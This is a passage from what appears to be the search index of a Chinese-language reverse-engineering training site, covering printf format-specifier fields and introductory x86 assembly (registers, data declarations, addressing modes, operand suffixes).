\u4ee5\u8868\u793a\u7cbe\u5ea6\u3002\u5bf9\u4e8e '<code>f</code>', '<code>F</code>', '<code>e</code>', '<code>E</code>', '<code>g</code>', '<code>G</code>', \u603b\u662f\u8f93\u51fa\u5c0f\u6570\u70b9\u3002\u5bf9\u4e8e '<code>o</code>', '<code>x</code>', '<code>X</code>', \u5728\u975e 0 \u6570\u503c\u524d\u5206\u522b\u8f93\u51fa\u524d\u7f00 <code>0</code>, <code>0x</code> \u548c <code>0X</code>\u8868\u793a\u6570\u5236 <code>0</code> \u5982\u679c <code>\u5bbd\u5ea6</code> \u9009\u9879\u524d\u7f00\u4e3a <code>0</code>\uff0c\u5219\u5728\u5de6\u4fa7\u7528 <code>0</code> \u586b\u5145\u76f4\u81f3\u8fbe\u5230\u5bbd\u5ea6\u8981\u6c42\u3002\u4f8b\u5982 <code>printf(\"%2d\", 3)</code> \u8f93\u51fa \"<code>3</code>\"\uff0c\u800c <code>printf(\"%02d\", 3)</code> \u8f93\u51fa \"<code>03</code>\"\u3002\u5982\u679c <code>0</code> \u4e0e <code>-</code> \u5747\u51fa\u73b0\uff0c\u5219 <code>0</code> \u88ab\u5ffd\u7565\uff0c\u5373\u5de6\u5bf9\u9f50\u4f9d\u7136\u7528\u7a7a\u683c\u586b\u5145 <ul> <li>\uff08\u53ef\u9009\uff09\u5bbd\u5ea6</li> </ul> <p>\u662f\u4e00\u4e2a\u7528\u6765\u6307\u5b9a\u8f93\u51fa\u5b57\u7b26\u7684\u6700\u5c0f\u4e2a\u6570\u7684\u5341\u8fdb\u5236\u975e\u8d1f\u6574\u6570\u3002\u5982\u679c\u5b9e\u9645\u4f4d\u6570\u591a\u4e8e\u5b9a\u4e49\u7684\u5bbd\u5ea6,\u5219\u6309\u5b9e\u9645\u4f4d\u6570\u8f93\u51fa\uff1b\u5982\u679c\u5b9e\u9645\u4f4d\u6570\u5c11\u4e8e\u5b9a\u4e49\u7684\u5bbd\u5ea6\u5219\u8865\u4ee5\u7a7a\u683c\u6216 0\u3002</p> <ul> <li>\uff08\u53ef\u9009\uff09\u7cbe\u5ea6</li> </ul> <p>\u7cbe\u5ea6\u662f\u7528\u6765\u6307\u793a\u6253\u5370\u5b57\u7b26\u4e2a\u6570\u3001\u5c0f\u6570\u4f4d\u6570\u6216\u8005\u6709\u6548\u6570\u5b57\u4e2a\u6570\u7684\u975e\u8d1f\u5341\u8fdb\u5236\u6574\u6570\u3002\u5bf9\u4e8e <code>d</code>\u3001<code>i</code>\u3001<code>u</code>\u3001<code>x</code>\u3001<code>o</code> \u7684\u6574\u578b\u6570\u503c\uff0c\u662f\u6307\u6700\u5c0f\u6570\u5b57\u4f4d\u6570\uff0c\u4e0d\u8db3\u7684\u4f4d\u8981\u5728\u5de6\u4fa7\u8865 0\uff0c\u5982\u679c\u8d85\u8fc7\u4e5f\u4e0d\u622a\u65ad\uff0c\u7f3a\u7701\u503c\u4e3a 1\u3002\u5bf9\u4e8e <code>a</code>, <code>A</code>, <code>e</code>, <code>E</code>, <code>f</code>, <code>F</code> \u7684\u6d6e\u70b9\u6570\u503c\uff0c\u662f\u6307\u5c0f\u6570\u70b9\u53f3\u8fb9\u663e\u793a\u7684\u6570\u5b57\u4f4d\u6570\uff0c\u5fc5\u8981\u65f6\u56db\u820d\u4e94\u5165\uff1b\u7f3a\u7701\u503c\u4e3a 6\u3002\u5bf9\u4e8e <code>g</code>, <code>G</code> \u7684\u6d6e\u70b9\u6570\u503c\uff0c\u662f\u6307\u6709\u6548\u6570\u5b57\u7684\u6700\u5927\u4f4d\u6570\u3002\u5bf9\u4e8e <code>s</code> \u7684\u5b57\u7b26\u4e32\u7c7b\u578b\uff0c\u662f\u6307\u8f93\u51fa\u7684\u5b57\u8282\u7684\u4e0a\u9650\uff0c\u8d85\u51fa\u9650\u5236\u7684\u5176\u5b83\u5b57\u7b26\u5c06\u88ab\u622a\u65ad\u3002\u5982\u679c\u57df\u5bbd\u4e3a <code>*</code>\uff0c\u5219\u7531\u5bf9\u5e94\u7684\u51fd\u6570\u53c2\u6570\u7684\u503c\u4e3a\u5f53\u524d\u57df\u5bbd\u3002\u5982\u679c\u4ec5\u7ed9\u51fa\u4e86\u5c0f\u6570\u70b9\uff0c\u5219\u57df\u5bbd\u4e3a 0\u3002</p> <ul> <li>\uff08\u53ef\u9009\uff09\u957f\u5ea6</li> </ul> \u5b57\u7b26 \u63cf\u8ff0 <code>hh</code> \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c<code>printf</code> \u671f\u5f85\u4e00\u4e2a\u4ece <code>char</code> \u63d0\u5347\u7684 <code>int</code> \u6574\u578b\u53c2\u6570 <code>h</code> \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c<code>printf</code> \u671f\u5f85\u4e00\u4e2a\u4ece <code>short</code> \u63d0\u5347\u7684 <code>int</code> \u6574\u578b\u53c2\u6570 <code>l</code> \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c<code>printf</code> \u671f\u5f85\u4e00\u4e2a <code>long</code> \u6574\u578b\u53c2\u6570\u3002\u5bf9\u4e8e\u6d6e\u70b9\u7c7b\u578b\uff0c<code>printf</code> \u671f\u5f85\u4e00\u4e2a <code>double</code> \u6574\u578b\u53c2\u6570\u3002\u5bf9\u4e8e\u5b57\u7b26\u4e32 <code>s</code> \u7c7b\u578b\uff0c<code>printf</code> \u671f\u5f85\u4e00\u4e2a <code>wchar_t</code> \u6307\u9488\u53c2\u6570\u3002\u5bf9\u4e8e\u5b57\u7b26 <code>c</code> \u7c7b\u578b\uff0c<code>printf</code> \u671f\u5f85\u4e00\u4e2a <code>wint_t</code> \u578b\u7684\u53c2\u6570 <code>ll</code> \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c<code>printf</code> \u671f\u5f85\u4e00\u4e2a <code>long long</code> \u6574\u578b\u53c2\u6570\u3002Microsoft \u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>I64</code> <code>L</code> \u5bf9\u4e8e\u6d6e\u70b9\u7c7b\u578b\uff0c<code>printf</code> \u671f\u5f85\u4e00\u4e2a <code>long double</code> \u6574\u578b\u53c2\u6570 <code>z</code> \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c<code>printf</code> \u671f\u5f85\u4e00\u4e2a <code>size_t</code> \u6574\u578b\u53c2\u6570 <code>j</code> \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c<code>printf</code> \u671f\u5f85\u4e00\u4e2a <code>intmax_t</code> \u6574\u578b\u53c2\u6570 <code>t</code> \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c<code>printf</code> \u671f\u5f85\u4e00\u4e2a <code>ptrdiff_t</code> \u6574\u578b\u53c2\u6570"},{"location":"Training/Material/Reverse/#_10","title":"\u4f8b\u5b50","text":"<pre><code>printf(\"Hello %%\");           // \"Hello %\"\nprintf(\"Hello World!\");       // \"Hello World!\"\nprintf(\"Number: %d\", 123);    // \"Number: 123\"\nprintf(\"%s %s\", \"Format\", \"Strings\");   // \"Format Strings\"\n\nprintf(\"%12c\", 'A');          // \"           A\"\nprintf(\"%16s\", \"Hello\");      // \"          Hello!\"\n\nint n;\nprintf(\"%12c%n\", 'A', &amp;n);    // n = 12\nprintf(\"%16s%n\", \"Hello!\", &amp;n); // n = 16\n\nprintf(\"%2$s %1$s\", \"Format\", \"Strings\"); // \"Strings Format\"\nprintf(\"%42c%1$n\", &amp;n);       // \u9996\u5148\u8f93\u51fa41\u4e2a\u7a7a\u683c\uff0c\u7136\u540e\u8f93\u51fa n \u7684\u4f4e\u516b\u4f4d\u5730\u5740\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u5bf9\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\u548c\u683c\u5f0f\u5b57\u7b26\u4e32\u6709\u4e86\u4e00\u4e2a\u8be6\u7ec6\u7684\u8ba4\u8bc6\uff0c\u540e\u9762\u7684\u7ae0\u8282\u4e2d\u6211\u4eec\u4f1a\u4ecb\u7ecd\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u5185\u5bb9\u3002</p>"},{"location":"Training/Material/Reverse/#_11","title":"\u6c47\u7f16\u8bed\u8a00","text":"<ul> <li>\u6c47\u7f16\u8bed\u8a00</li> <li>3.3 X86 \u6c47\u7f16\u57fa\u7840<ul> <li>3.3.2 \u5bc4\u5b58\u5668 Registers</li> <li>3.3.3 \u5185\u5b58\u548c\u5bfb\u5740\u6a21\u5f0f Memory and Addressing Modes</li> <li>3.3.3.1 \u58f0\u660e\u9759\u6001\u6570\u636e\u533a\u57df</li> <li>3.3.3.2 \u5185\u5b58\u5bfb\u5740</li> <li>3.3.3.3 \u64cd\u4f5c\u540e\u7f00</li> <li>3.3.4 \u6307\u4ee4 Instructions</li> <li>3.3.4.1 \u6570\u636e\u79fb\u52a8\u6307\u4ee4</li> <li>3.3.4.2 \u903b\u8f91\u8fd0\u7b97\u6307\u4ee4</li> <li>3.3.4.3 \u6d41\u7a0b\u63a7\u5236\u6307\u4ee4</li> <li>3.3.5 \u8c03\u7528\u7ea6\u5b9a Calling Convention</li> <li>3.3.5.1 \u8c03\u7528\u8005\u7ea6\u5b9a Caller Rules</li> <li>3.3.5.2 \u88ab\u8c03\u7528\u8005\u7ea6\u5b9a Callee Rules</li> </ul> </li> <li>3.4 x64 \u6c47\u7f16\u57fa\u7840<ul> <li>3.4.1 \u5bfc\u8bed</li> <li>3.4.2 \u5bc4\u5b58\u5668 Registers</li> <li>3.4.3 \u5bfb\u5740\u6a21\u5f0f Addressing modes</li> <li>3.4.4 \u901a\u7528\u6307\u4ee4 Common instructions</li> <li><code>mov</code> \u548c <code>lea</code> \u6307\u4ee4</li> <li>\u7b97\u672f\u548c\u4f4d\u8fd0\u7b97</li> <li>\u6d41\u7a0b\u63a7\u5236\u6307\u4ee4</li> <li><code>setx</code>\u548c<code>movx</code></li> <li>\u51fd\u6570\u8c03\u7528\u4e0e\u6808</li> <li>3.4.5 \u6c47\u7f16\u548c gdb</li> </ul> </li> <li>3.5 ARM\u6c47\u7f16\u57fa\u7840<ul> <li>3.5.1 \u5f15\u8a00</li> <li>3.5.2 ARM \u7684 GNU \u6c47\u7f16\u7a0b\u5e8f\u6307\u4ee4\u8868</li> <li>3.5.3 \u5bc4\u5b58\u5668\u540d\u79f0</li> <li>3.5.4 \u6c47\u7f16\u7a0b\u5e8f\u7279\u6b8a\u5b57\u7b26/\u8bed\u6cd5</li> <li>3.5.5 arm\u7a0b\u5e8f\u8c03\u7528\u6807\u51c6</li> <li>3.5.6 \u5bfb\u5740\u6a21\u5f0f</li> <li>3.5.7 \u673a\u5668\u76f8\u5173\u6307\u4ee4</li> </ul> </li> <li>3.6 MIPS\u6c47\u7f16\u57fa\u7840<ul> <li>\u6570\u636e\u7c7b\u578b\u548c\u5e38\u91cf</li> <li>\u5bc4\u5b58\u5668</li> <li>\u7a0b\u5e8f\u7ed3\u6784</li> <li>\u6570\u636e\u58f0\u660e</li> <li>\u4ee3\u7801</li> <li>\u6ce8\u91ca</li> <li>\u53d8\u91cf\u58f0\u660e</li> <li>\u8bfb\u53d6/\u5199\u5165 ( Load/Store )\u6307\u4ee4</li> <li>\u95f4\u63a5\u548c\u7acb\u5373\u5bfb\u5740</li> <li>\u7b97\u672f\u6307\u4ee4</li> <li>\u6d41\u7a0b\u63a7\u5236</li> <li>\u7cfb\u7edf\u8c03\u7528\u548c I / O\uff08 \u9488\u5bf9 SPIM \u6a21\u62df\u5668 \uff09</li> </ul> </li> </ul>"},{"location":"Training/Material/Reverse/#33-x86","title":"3.3 X86 \u6c47\u7f16\u57fa\u7840","text":""},{"location":"Training/Material/Reverse/#332-registers","title":"3.3.2 \u5bc4\u5b58\u5668 Registers","text":"<p>\u73b0\u4ee3 ( 386\u53ca\u4ee5\u4e0a\u7684\u673a\u5668 )x86 \u5904\u7406\u5668\u6709 8 \u4e2a 32 \u4f4d\u901a\u7528\u5bc4\u5b58\u5668, \u5982\u56fe 1 \u6240\u793a. </p> <p>\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u540d\u5b57\u90fd\u662f\u6709\u70b9\u5386\u53f2\u7684, \u4f8b\u5982 EAX \u8fc7\u53bb\u88ab\u79f0\u4e3a \u7d2f\u52a0\u5668, \u56e0\u4e3a\u5b83\u88ab\u7528\u6765\u4f5c\u5f88\u591a\u7b97\u672f\u8fd0\u7b97, \u8fd8\u6709 <code>ECX</code> \u88ab\u79f0\u4e3a \u8ba1\u6570\u5668 , \u56e0\u4e3a\u5b83\u88ab\u7528\u6765\u4fdd\u5b58\u5faa\u73af\u7684\u7d22\u5f15 ( \u5c31\u662f\u5faa\u73af\u6b21\u6570 ). \u5c3d\u7ba1\u5927\u591a\u662f\u5bc4\u5b58\u5668\u5728\u73b0\u4ee3\u6307\u4ee4\u96c6\u4e2d\u5df2\u7ecf\u5931\u53bb\u4e86\u5b83\u4eec\u7684\u7279\u6b8a\u7528\u9014, \u4f46\u662f\u6309\u7167\u60ef\u4f8b, \u5176\u4e2d\u6709\u4e24\u4e2a\u5bc4\u5b58\u5668\u8fd8\u662f\u6709\u5b83\u4eec\u7684\u7279\u6b8a\u7528\u9014 ---<code>ESP</code> \u548c EBP.</p> <p>\u5bf9\u4e8e <code>EAS</code>, <code>EBX</code>, <code>ECX</code> \u8fd8\u6709 <code>EDX</code> \u5bc4\u5b58\u5668, \u5b83\u4eec\u53ef\u4ee5\u88ab\u5206\u6bb5\u5f00\u6765\u4f7f\u7528. \u4f8b\u5982, \u53ef\u4ee5\u5c06 <code>EAX</code> \u7684\u6700\u4f4e\u7684 2 \u4f4d\u5b57\u8282\u89c6\u4e3a 16 \u4f4d\u5bc4\u5b58\u5668 ( <code>AX</code> ). \u8fd8\u53ef\u4ee5\u5c06 <code>AX</code> \u7684\u6700\u4f4e\u4f4d\u7684 1 \u4e2a\u5b57\u8282\u770b\u6210 8 \u4f4d\u5bc4\u5b58\u5668\u6765\u7528 ( <code>AL</code> ), \u5f53\u7136 <code>AX</code> \u7684\u9ad8\u4f4d\u7684 1 \u4e2a\u5b57\u8282\u4e5f\u53ef\u4ee5\u770b\u6210\u662f\u4e00\u4e2a 8 \u4f4d\u5bc4\u5b58\u5668 ( <code>AH</code> ). \u8fd9\u4e9b\u540d\u79f0\u6709\u5b83\u4eec\u76f8\u5bf9\u5e94\u7684\u7269\u7406\u5bc4\u5b58\u5668. \u5f53\u4e24\u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u6570\u636e\u88ab\u653e\u5230 <code>DX</code> \u7684\u65f6\u5019, \u539f\u672c <code>DH</code>, <code>DL</code> \u548c <code>EDX</code> \u7684\u6570\u636e\u4f1a\u53d7\u5230\u5f71\u54cd ( \u88ab\u8986\u76d6\u4e4b\u7c7b\u7684 ). \u8fd9\u4e9b \" \u5b50\u5bc4\u5b58\u5668 \" \u4e3b\u8981\u6765\u81ea\u4e8e\u6bd4\u8f83\u4e45\u8fdc\u7684 16 \u4f4d\u7248\u672c\u6307\u4ee4\u96c6. \u7136\u800c, \u59dc\u8fd8\u662f\u8001\u7684\u8fa3, \u5728\u5904\u7406\u5c0f\u4e8e 32 \u4f4d\u7684\u6570\u636e\u7684\u65f6\u5019, \u6bd4\u5982 1 \u4e2a\u5b57\u8282\u7684 ASCII \u5b57\u7b26, \u5b83\u4eec\u6709\u65f6\u4f1a\u5f88\u65b9\u4fbf.</p>"},{"location":"Training/Material/Reverse/#333-memory-and-addressing-modes","title":"3.3.3 \u5185\u5b58\u548c\u5bfb\u5740\u6a21\u5f0f Memory and Addressing Modes","text":""},{"location":"Training/Material/Reverse/#3331","title":"3.3.3.1 \u58f0\u660e\u9759\u6001\u6570\u636e\u533a\u57df","text":"<p>\u4f60\u53ef\u4ee5\u7528\u7279\u6b8a\u7684 x86 \u6c47\u7f16\u6307\u4ee4\u5728\u5185\u5b58\u4e2d\u58f0\u660e\u9759\u6001\u6570\u636e\u533a\u57df ( \u7c7b\u4f3c\u4e8e\u5168\u5c40\u53d8\u91cf ). <code>.data</code>\u6307\u4ee4\u7528\u6765\u58f0\u660e\u6570\u636e. \u6839\u636e\u8fd9\u6761\u6307\u4ee4, <code>.byte</code>, <code>.short</code> \u548c <code>.long</code> \u53ef\u4ee5\u5206\u522b\u7528\u6765\u58f0\u660e 1 \u4e2a\u5b57\u8282, 2 \u4e2a\u5b57\u8282\u548c 4 \u4e2a\u5b57\u8282\u7684\u6570\u636e. \u6211\u4eec\u53ef\u4ee5\u7ed9\u5b83\u4eec\u6253\u4e2a\u6807\u7b7e, \u7528\u6765\u5f15\u7528\u521b\u5efa\u7684\u6570\u636e\u7684\u5730\u5740. \u6807\u7b7e\u5728\u6c47\u7f16\u8bed\u8a00\u4e2d\u662f\u975e\u5e38\u6709\u7528\u7684, \u5b83\u4eec\u7ed9\u5185\u5b58\u5730\u5740\u547d\u540d, \u7136\u540e\u7f16\u8bd1\u5668 \u548c\u94fe\u63a5\u5668 \u5c06\u5176 \" \u7ffb\u8bd1 \" \u6210\u8ba1\u7b97\u673a\u7406\u89e3\u7684\u673a\u5668\u4ee3\u7801. \u8fd9\u4e2a\u8ddf\u7528\u540d\u79f0\u6765\u58f0\u660e\u53d8\u91cf\u5f88\u7c7b\u4f3c, \u4f46\u662f\u5b83\u9075\u5b88\u4e00\u4e9b\u8f83\u4f4e\u7ea7\u522b\u7684\u89c4\u5219. \u4f8b\u5982, \u6309\u987a\u5e8f\u58f0\u660e\u7684\u4f4d\u7f6e\u5c06\u5f7c\u6b64\u76f8\u90bb\u5730\u5b58\u50a8\u5728\u5185\u5b58\u4e2d. \u8fd9\u8bdd\u4e5f\u8bb8\u6709\u70b9\u7ed5, \u5c31\u662f\u6309\u7167\u987a\u5e8f\u6253\u7684\u6807\u7b7e, \u8fd9\u4e9b\u6807\u7b7e\u5bf9\u5e94\u7684\u6570\u636e\u4e5f\u4f1a\u6309\u7167\u987a\u5e8f\u88ab\u653e\u5230\u5185\u5b58\u4e2d.</p> <p>\u4e00\u4e9b\u4f8b\u5b50 :</p> <pre><code>.data\nvar :\n       .byte 64 ;\u58f0\u660e\u4e00\u4e2a\u5b57\u8282\u578b\u53d8\u91cf var, \u5176\u6240\u5bf9\u5e94\u7684\u6570\u636e\u662f64\n       .byte 10 ;\u58f0\u660e\u4e00\u4e2a\u6570\u636e 10, \u8fd9\u4e2a\u6570\u636e\u6ca1\u6709\u6240\u8c13\u7684 \" \u6807\u7b7e \", \u5b83\u7684\u5185\u5b58\u5730\u5740\u5c31\u662f var+1.\n\nx :\n       .short 42 ;\u58f0\u660e\u4e00\u4e2a\u5927\u5c0f\u4e3a 2 \u4e2a\u5b57\u8282\u7684\u6570\u636e, \u8fd9\u4e2a\u6570\u636e\u6709\u4e2a\u6807\u7b7e \" x \"\n\ny :\n       .long 30000 ;\u58f0\u660e\u4e00\u4e2a\u5927\u5c0f\u4e3a 4 \u4e2a\u5b57\u8282\u7684\u6570\u636e, \u8fd9\u4e2a\u6570\u636e\u6807\u7b7e\u662f \" y \",  y \u7684\u503c\u88ab\u521d\u59cb\u5316\u4e3a 30000\n</code></pre> <p>\u4e0e\u9ad8\u7ea7\u8bed\u8a00\u4e0d\u540c, \u9ad8\u7ea7\u8bed\u8a00\u7684\u6570\u7ec4\u53ef\u4ee5\u5177\u6709\u591a\u4e2a\u7ef4\u5ea6\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u7d22\u5f15\u6765\u8bbf\u95ee, x86 \u6c47\u7f16\u8bed\u8a00\u7684\u6570\u7ec4\u53ea\u662f\u5728\u5185\u5b58\u4e2d\u8fde\u7eed\u7684\" \u5355\u5143\u683c \". \u4f60\u53ea\u9700\u8981\u628a\u6570\u503c\u5217\u51fa\u6765\u5c31\u53ef\u4ee5\u58f0\u660e\u4e00\u4e2a\u6570\u7ec4, \u6bd4\u5982\u4e0b\u9762\u7684\u7b2c\u4e00\u4e2a\u4f8b\u5b50. \u5bf9\u4e8e\u4e00\u4e9b\u5b57\u8282\u578b\u6570\u7ec4\u7684\u7279\u6b8a\u60c5\u51b5, \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5b57\u7b26\u4e32. \u5982\u679c\u8981\u5728\u5927\u591a\u6570\u7684\u5185\u5b58\u586b\u5145 0, \u4f60\u53ef\u4ee5\u4f7f\u7528<code>.zero</code>\u6307\u4ee4.</p> <p>\u4f8b\u5b50 :</p> <pre><code>s :\n       .long 1, 2, 3 ;\u58f0\u660e 3 \u4e2a\u5927\u5c0f\u4e3a 4 \u5b57\u8282\u7684\u6570\u636e 1, 2, 3. \u5185\u5b58\u4e2d s+8 \u8fd9\u4e2a\u6807\u7b7e\u6240\u5bf9\u5e94\u7684\u6570\u636e\u5c31\u662f 3.\n\nbarr:\n       .zero 10 ;\u4ece barr \u8fd9\u4e2a\u6807\u7b7e\u7684\u4f4d\u7f6e\u5f00\u59cb, \u58f0\u660e 10 \u4e2a\u5b57\u8282\u7684\u6570\u636e, \u8fd9\u4e9b\u6570\u636e\u88ab\u521d\u59cb\u5316\u4e3a 0.\n\nstr :\n       .string \"hello\" ;\u4ece str \u8fd9\u4e2a\u6807\u7b7e\u7684\u4f4d\u7f6e\u5f00\u59cb, \u58f0\u660e 6 \u4e2a\u5b57\u8282\u7684\u6570\u636e, \u5373 hello \u5bf9\u5e94\u7684 ASCII \u503c, \u8fd9\u6700\u540e\u8fd8\u8ddf\u6709\u4e00\u4e2a nul(0) \u5b57\u8282.\n</code></pre> <p></p> <p></p> <p></p>"},{"location":"Training/Material/Reverse/#3332","title":"3.3.3.2 \u5185\u5b58\u5bfb\u5740","text":"<p>\u73b0\u4ee3x86\u517c\u5bb9\u5904\u7406\u5668\u80fd\u591f\u5bfb\u5740\u9ad8\u8fbe 2^32 \u5b57\u8282\u7684\u5185\u5b58 : \u5185\u5b58\u5730\u5740\u4e3a 32 \u4f4d\u5bbd. \u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u6807\u7b7e\u6765\u5f15\u7528\u5185\u5b58\u533a\u57df\uff0c\u8fd9\u4e9b\u6807\u7b7e\u5b9e\u9645\u4e0a\u88ab 32 \u4f4d\u6570\u636e\u7684\u6c47\u7f16\u7a0b\u5e8f\u66ff\u6362\uff0c\u8fd9\u4e9b\u6570\u636e\u6307\u5b9a\u4e86\u5185\u5b58\u4e2d\u7684\u5730\u5740. \u9664\u4e86\u652f\u6301\u901a\u8fc7\u6807\u7b7e\uff08\u5373\u5e38\u6570\u503c\uff09\u5f15\u7528\u5b58\u50a8\u533a\u57df\u4e4b\u5916\uff0cx86\u63d0\u4f9b\u4e86\u4e00\u79cd\u7075\u6d3b\u7684\u8ba1\u7b97\u548c\u5f15\u7528\u5185\u5b58\u5730\u5740\u7684\u65b9\u6848 \uff1a\u6700\u591a\u53ef\u5c06\u4e24\u4e2a32\u4f4d\u5bc4\u5b58\u5668\u548c\u4e00\u4e2a32\u4f4d\u6709\u7b26\u53f7\u5e38\u91cf\u76f8\u52a0\uff0c\u4ee5\u8ba1\u7b97\u5b58\u50a8\u5668\u5730\u5740. \u5176\u4e2d\u4e00\u4e2a\u5bc4\u5b58\u5668\u53ef\u4ee5\u9009\u62e9\u9884\u5148\u4e58\u4ee5 2, 4 \u6216 8.</p> <p>\u5bfb\u5740\u6a21\u5f0f\u53ef\u4ee5\u548c\u8bb8\u591a x86 \u6307\u4ee4\u4e00\u8d77\u4f7f\u7528 ( \u6211\u4eec\u5c06\u5728\u4e0b\u4e00\u8282\u5bf9\u5b83\u4eec\u8fdb\u884c\u8bb2\u89e3 ). \u8fd9\u91cc\u6211\u4eec\u7528<code>mov</code>\u6307\u4ee4\u5728\u5bc4\u5b58\u5668\u548c\u5185\u5b58\u4e2d\u79fb\u52a8\u6570\u636e\u5f53\u4f5c\u4f8b\u5b50. \u8fd9\u4e2a\u6307\u4ee4\u6709\u4e24\u4e2a\u53c2\u6570, \u7b2c\u4e00\u4e2a\u662f\u6570\u636e\u7684\u6765\u6e90, \u7b2c\u4e8c\u4e2a\u662f\u6570\u636e\u7684\u53bb\u5411.</p> <p>\u4e00\u4e9b<code>mov</code>\u7684\u4f8b\u5b50 :</p> <pre><code>mov (%ebx), %eax ;\u4ece EBX \u4e2d\u7684\u5185\u5b58\u5730\u5740\u52a0\u8f7d 4 \u4e2a\u5b57\u8282\u7684\u6570\u636e\u5230 EAX, \u5c31\u662f\u628a EBX \u4e2d\u7684\u5185\u5bb9\u5f53\u4f5c\u6807\u7b7e, \u8fd9\u4e2a\u6807\u7b7e\u5728\u5185\u5b58\u4e2d\u5bf9\u5e94\u7684\u6570\u636e\u653e\u5230 EAX \u4e2d\n;\u540e\u9762\u5982\u679c\u6ca1\u6709\u8bf4\u660e\u7684\u8bdd, (%ebx)\u5c31\u8868\u793a\u5bc4\u5b58\u5668ebx\u4e2d\u5b58\u50a8\u7684\u5185\u5bb9\n\nmov %ebx, var(,1) ; \u5c06 EBX \u4e2d\u7684 4 \u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u6570\u636e\u79fb\u52a8\u7684\u5185\u5b58\u4e2d\u6807\u7b7e\u4e3a var \u7684\u5730\u65b9\u53bb.( var \u662f\u4e00\u4e2a 32 \u4f4d\u5e38\u6570).\n\nmov (%esi, %ebx, 4), %edx ;\u5c06\u5185\u5b58\u4e2d\u6807\u7b7e\u4e3a ESI+4*EBX \u6240\u5bf9\u5e94\u7684 4 \u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u6570\u636e\u79fb\u52a8\u5230 EDX\u4e2d.\n</code></pre> <p>\u4e00\u4e9b\u9519\u8bef\u7684\u4f8b\u5b50:</p> <pre><code>mov (%ebx, %ecx, -1), %eax ;\u8fd9\u4e2a\u53ea\u80fd\u628a\u5bc4\u5b58\u5668\u4e2d\u7684\u503c\u52a0\u4e0a\u4e00\u904d.\nmov %ebx,(%eax, %esi, %edi, 1) ;\u5728\u5730\u5740\u8ba1\u7b97\u4e2d, \u6700\u591a\u53ea\u80fd\u51fa\u73b0 2 \u4e2a\u5bc4\u5b58\u5668, \u8fd9\u91cc\u5374\u6709 3 \u4e2a\u5bc4\u5b58\u5668.\n</code></pre>"},{"location":"Training/Material/Reverse/#3333","title":"3.3.3.3 \u64cd\u4f5c\u540e\u7f00","text":"<p>\u901a\u5e38, \u7ed9\u5b9a\u5185\u5b58\u5730\u5740\u7684\u6570\u636e\u7c7b\u578b\u53ef\u4ee5\u4ece\u5f15\u7528\u5b83\u7684\u6c47\u7f16\u6307\u4ee4\u63a8\u65ad\u51fa\u6765. \u4f8b\u5982, \u5728\u4e0a\u9762\u7684\u6307\u4ee4\u4e2d, \u4f60\u53ef\u4ee5\u4ece\u5bc4\u5b58\u5668\u64cd\u4f5c\u6570\u7684\u5927\u5c0f\u6765\u63a8\u51fa\u5176\u6240\u5360\u7684\u5185\u5b58\u5927\u5c0f. \u5f53\u6211\u4eec\u52a0\u8f7d\u4e00\u4e2a 32 \u4f4d\u7684\u5bc4\u5b58\u5668\u7684\u65f6\u5019, \u7f16\u8bd1\u5668\u5c31\u53ef\u4ee5\u63a8\u65ad\u51fa\u6211\u4eec\u7528\u5230\u7684\u5185\u5b58\u5927\u5c0f\u662f 4 \u4e2a\u5b57\u8282\u5bbd. \u5f53\u6211\u4eec\u5c06 1 \u4e2a\u5b57\u8282\u5bbd\u7684\u5bc4\u5b58\u5668\u7684\u503c\u4fdd\u5b58\u5230\u5185\u5b58\u4e2d\u65f6, \u7f16\u8bd1\u5668\u53ef\u4ee5\u63a8\u65ad\u51fa\u6211\u4eec\u60f3\u8981\u5728\u5185\u5b58\u4e2d\u5f04\u4e2a 1 \u5b57\u8282\u5927\u5c0f\u7684 \" \u5751 \" \u6765\u4fdd\u5b58\u6211\u4eec\u7684\u6570\u636e.</p> <p>\u7136\u800c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b, \u6211\u4eec\u7528\u5230\u7684\u5185\u5b58\u4e2d \" \u5751 \" \u7684\u5927\u5c0f\u662f\u4e0d\u660e\u786e\u7684. \u6bd4\u5982\u8bf4\u8fd9\u6761\u6307\u4ee4 <code>mov $2,(%ebx)</code>. \u8fd9\u6761\u6307\u4ee4\u662f\u5426\u5e94\u8be5\u5c06 \" 2 \" \u8fd9\u4e2a\u503c\u79fb\u52a8\u5230 EBX \u4e2d\u7684\u503c\u6240\u4ee3\u8868\u7684\u5730\u5740 \" \u5751 \" \u7684\u5355\u4e2a\u5b57\u8282\u4e2d ? \u4e5f\u8bb8\u5b83\u8868\u793a\u7684\u662f\u5c06 32 \u4f4d\u6574\u6570\u8868\u793a\u7684 2 \u79fb\u52a8\u5230\u4ece\u5730\u5740 EBX \u5f00\u59cb\u7684 4 \u5b57\u8282. \u65e2\u7136\u8fd9\u4e24\u4e2a\u89e3\u91ca\u90fd\u6709\u9053\u7406, \u4f46\u8ba1\u7b97\u673a\u6c47\u7f16\u7a0b\u5e8f\u5fc5\u987b\u660e\u786e\u54ea\u4e2a\u89e3\u91ca\u624d\u662f\u6b63\u786e\u7684, \u8ba1\u7b97\u673a\u5f88\u5355\u7eaf\u7684, \u8981\u4e48\u662f\u9519\u7684\u8981\u4e48\u662f\u5bf9\u7684. \u524d\u7f00 b, w, \u548c l \u5c31\u662f\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684, \u5b83\u4eec\u5206\u522b\u8868\u793a 1, 2 \u548c 4 \u4e2a\u5b57\u8282\u7684\u5927\u5c0f.</p> 